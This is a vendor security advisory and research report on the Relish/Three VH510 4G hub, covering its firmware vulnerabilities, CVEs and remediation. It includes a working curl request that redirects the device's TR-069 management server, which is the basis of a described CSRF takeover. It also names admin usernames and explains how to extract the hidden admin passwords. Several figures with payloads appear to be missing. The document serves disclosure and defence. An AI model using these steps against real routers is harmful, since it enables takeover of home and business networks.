1  Objective

6point6 is an independent award-winning technology consultancy specialising in Emerging Technology, Cyber
Security, and Digital Transformation. We are committed to safeguarding the security of our customers and that
of our providers, furthermore we respect the research community and want to share our knowledge.

Our research lab is dedicated to the discovery of new potential security weaknesses in various products and
applications. Relish is one of our Internet broadband providers, and therefore, its essential for us to make sure
analysis and perform research and analysis on products we ourselves use. specialising in Cyber Security.

The purpose of this document is to illustrate our findings and demonstrate how attackers may exploit these
vulnerabilities to compromise Relish VH510 devices, affecting both home and business customers.

2  Scope

The following section lists what is included within the scope and what is not.

In the Scope:

•  Relish 4G Hub VH510 device (running VH510B_V1.0.1.6L0516 firmware)

Out of Scope:

•  TR-069 device management
•  Backend or internal network systems used by Relish

3  Overview of Vulnerabilities

A summary of discovered vulnerabilities within the web management portal. These vulnerabilities are found in
both business and home user devices. The product - Relish 4G VH510B in-door hub running the latest firmware
available (VH510B_V1.0.1.6L0516) as of 26th July 2019.

•  Default hidden administrator credentials
•  Multiple CSRF/XSRF vulnerabilities in web management
•  Multiple XSS vulnerabilities in web management
•  Boa web server vulnerable to Denial of Service/ Potential RCE via buffer overflow

3.1 Default hidden admin credentials

The Relish web management interface contains two types of user accounts. A standard ‘user’ which is well
documented and provided installation set-up guide. There also exists an administrator or ‘super user’ account
which, when logged-in onto web management interface, provides additional configuration features which are
not available to standard users. Furthermore, FTP and Telnet services are both running insecure protocols which
allows the attackers to login using these hidden credentials.

Impact
Medium  Medium

Risk

These were obtained through two different methods using the standard user account.

1.  Creating a backup of the configuration file within the management portal located under the navigation

pane; Admin > Backup/Restore (this file is stored as a standard XML format).

2.  Obtaining a file from the FTP service located in /var/tmp/config.xml.  This only required the

standard ‘user’ account which is provided by Relish for first time set-up installation.

Example of output from a business customer device:

Figure 3-1 Default administrator credentials on a business broadband device

3.2  Multiple Cross Site Request Forgery

The web management interface is prone to multiple CSRF/XSRF vulnerabilities. These security issues are
magnified in severity due to the fact that default credentials are present and also that the login form does not

provide any protection against CSRF. This allows an attacker to launch a chain of CSRF remote exploits through a
Phishing campaign, for example.

Impact
Medium  Medium

Risk

3.2.1  Log-in Form

The attacker can forge an authentication request to log-in as a client on the same network. With an
authenticated user’s session, the attacker has access to sensitive configuration options widening the attack
surface. Due to the previously discussed vulnerability it would be rather simple for an attacker to launch a
Phishing attempt.

Example of the authentication POST HTTP request with an empty ‘challenge’ parameter:

Figure 3-2 Authentication request with empty challenge parameter

3.2.2  TR-069 Configuration

When logged-in as the administrator an additional configuration feature exists called the TR-069 configuration.
This feature is responsible for communicating with a centralised management server over a WAN connection. To
accept operations such as firmware upgrade, configuration changes, reboots and more.

Figure 3-3 TR-069 Configuration Page

Example of a request to update the TR-069 configuration settings using `curl` command:

curl -X POST http://192.168.1.1/boaform/formTR069Config \

-F 'autoexec=1' \
-F 'enable_cwmp=1' \
-F 'tr069_itf=65535' \
-F 'url=http://192.168.1.10/' \
-F 'username=user' \
-F 'password=password' \
-F 'enable=1' \
-F 'interval=30' \
-F 'save=Apply' \
-F 'submit-url=/admin/login.asp'

3.2.3  Reboot Device

A feature called ‘Commit and Reboot’ exists within the ‘Admin’ section. When this form is submitted via a POST
request it saves the current changes to memory and reboots the device. This may be used by attackers to deny
service by constantly sending reboot requests, which is a form of a Denial of Service attack.

3.3  Multiple Cross Site Scripting

The web management interface contains numerous persistent XSS vulnerabilities. An attacker is be able to store
HTML and JavaScript tags within certain configuration fields. However, these security issues are considered low
risk due to the low impact in a real-world scenario.

Impact  Risk
Low
Low

3.3.1  URLBlocking Settings

In the Firewall section a feature called URLBlocking is used for blocking clients from accessing specific domain
names based on any keywords specified. When a user submits a POST request to add input, the form parameter
urlFQDN does not properly escape or filter out HTML tags.

Example - JavaScript which displays a message in the web browser once the page has been reloaded:

3.3.2  SNMP Settings

In the Advanced section a feature to change SNMP (Simple Network Management Protocol) settings is available.
The following shows what parameters can be updated for the SNMP service:

•  snmpSysDescr
•  snmpSysContact
•  snmpSysName
•  snmpCommunityRO
•  snmpCommunityRW

Only client-side JavaScript checks are done on input before being submitted to the web server. The following
form parameters do not properly escape or apply any sort of filtering for user input when sending POST requests
to /boaform/formSnmpConfig

An example of updating the snmpSysName field to display a message on the home page. You can view the
modification within the firmware version on the main status page. This could be abused to redirect users to
malicious sites.

3.3.3  System Log Settings

In admin section of the configuration page, exists a feature to configure device system logs. The sort of logs that
are generated are login attempts, web server errors, daemon services info. The recent logs are displayed within
a table but can also be downloaded via the FTP service. By default, this feature is disabled but can be enabled
with the admin account. The standard user does not have access to this feature.

Impact  Risk

When requesting a resource that does not exist, the web server generates error messages. These requests are
logged and stored within syslog file. The following shows a URL path with HTML tags included, which generates a
404 error.

Here we can see the HTML tags being rendered by the web browser in the system log table.

3.4  Boa Denial of Service Vulnerability

A locally authenticated user may be able to send a POST HTTP request which crashes the Boa web server. This
results in users not having access to the management portal, requiring a router reboot to resume usage. This
vulnerability may be a buffer overflow which potentially could lead to Remote Command Execution.

In some cases, Boa web server wasn’t the only service to stop functioning. Other services such as FTP and Telnet
would not work either, even after a device reboot. This required resetting the device to its default state.

Impact
Medium  Medium

Risk

The affected parameter blkDomain does not validate input size.  An example of a POST request using
`Repeater` to launch a DoS attack on the management portal:

4 Proof of Concept

The proof of concept exploits default administrator credentials and multiple CSRF vulnerabilities to compromise
a device through the web management. To make this attack persistent a request is made to update the TR-069
configuration settings. This adds a malicious ACS server which the attacker controls to manage that device
remotely.

Although launched remotely, it requires a user to visit a link or page and be on the same network/subnet as the
Relish device.

JavaScript code is executed on the victim’s web browser which starts the process;

• Attempts to authenticate using the administrator account
• Modifies TR-069 Configuration settings to an attacker-controlled ACS

Once the Relish device is connected to an attacker’s ACS server, it’s possible to issue commands remotely, such
as; rebooting device, uploading backdoored firmware, stealing network credentials and potentially bricking the
device.

4.2 Proof of Concept Exploit

A CSRF html page that automatically submits two web forms. Firstly, submits an authentication request to the
local web management portal with the hardcoded admin credentials. Afterwards, another request is sent to
update the TR-069 configuration settings used to remotely manage devices, the device will then be controlled by
the attacker:

[![Twitter icon](https://6point6.co.uk/wp-content/themes/6point6/images/new-twitter-icon-blk.svg)](https://twitter.com/intent/tweet?text=Security advisory: relish 4G hub VH510&url=https://6point6.co.uk/insights/security-advisory-relish-4g-hub-vh510/)

##

## Affected products

This affects both business and home customers.

* Product Name: Verve Connect VH510.
* Hardware Version: L0AM095A.
* Firmware Version: < V1.0.1.6L0516 (newer version may also be affected).

All of these devices have a default SSID of “Relish\_Home\_XXXXXX”.

## Risk

Small Business Entities: HIGH

Home Users: HIGH

## Summary

The Verve Connect 4G hub provided by Relish (now known as Three Broadband) contains multiple vulnerabilities, which when combined may allow an attacker to take over the device.

A default administrator password (CVE-2020-27689) was found in three devices that we tested.

There are multiple CSRF vulnerabilities (CVE-2020-27692) which exist in the web management interface, including the login page and a feature for device management. With the default admin credentials, attackers can force users that are on the same network to login into the web management interface and potentially gain remote access or control the network device.

A buffer overflow vulnerability (CVE-2020-27690) was found. The file /boaform/admin/formDOMAINBLK does not properly filter or check the size of a ‘blkDomain’ parameter when sending a POST request. This causes the Boa server to crash and may also lead to remote command execution. This POST request is also vulnerable to the CSRF which allows this attack to be launched remotely, requiring a user that’s on the same network to click a link.

The are also multiple XSS vulnerabilities (CVE-2020-27691) which have low impact. The affect components are URLBlocking Settings, SNMP Settings, and System Log Settings, which allow attackers to inject JS and HTML tags.

## Remediation

The Verve Connect hub may no longer be maintained or supported, yet there are many companies and home users that still use this device. It’s important that you follow the instructions below to help keep safe and prevent attackers compromising your network.

1. Change the default super admin password within the management portal.
   * For business customers the username is: UKBadmin
   * For home customers the username is: admin
   * Admin passwords can be found by logging into the management portal using the standard credentials provided by Relish and navigate to Admin > Backup/Restore.
2. Disable or block access to the web management portal. This can be achieved by using a separate network appliance such as a switch or a hardware based firewall solution.
3. Disable direct wireless connectivity to the device and set up a separate hardware access point if needed.
